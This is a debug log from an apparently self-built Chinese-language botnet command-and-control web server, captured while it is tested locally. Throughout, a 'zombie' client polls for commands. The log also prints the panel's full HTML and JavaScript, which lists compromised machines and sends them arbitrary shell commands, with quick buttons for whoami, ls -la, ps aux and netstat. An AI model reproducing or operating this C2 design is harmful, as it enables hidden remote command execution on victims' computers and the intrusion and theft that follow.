2025-06-25 00:23:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:40 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:41 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:23:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:23:42 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:23:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:23:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:23:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:45 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:24:45 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:24:45 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:24:45 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:24:45 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:24:45 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:24:45 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:24:45 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:24:45 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:24:45 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:24:45 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:24:45 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:24:45 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:24:45 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:24:45 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:24:45 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:24:45 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:24:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:45 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0227s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:46 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:47 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:48 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:49 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-25 00:24:49 | INFO     | index_routes.py:23 | index() | 用戶訪問首頁
2025-06-25 00:24:49 | INFO     | index_routes.py:26 | index() | 查詢到 0 個目標
2025-06-25 00:24:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0106s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>扫描目标管理系统</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n    </body>\n    \n</html>'
2025-06-25 00:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:49] "GET / HTTP/1.1" 200 -
2025-06-25 00:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:49] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:24:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:50 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:51 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:24:51 | INFO     | control_route.py:101 | get_messages() | 用戶請求獲取消息
2025-06-25 00:24:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0059s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:51] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:51] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 00:24:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:24:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:52 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:53] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:24:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:53 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:54 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:54] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:24:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:55 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:56 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:57 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:58 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:24:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-25 00:24:59 | INFO     | index_routes.py:23 | index() | 用戶訪問首頁
2025-06-25 00:24:59 | INFO     | index_routes.py:26 | index() | 查詢到 0 個目標
2025-06-25 00:24:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>扫描目标管理系统</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 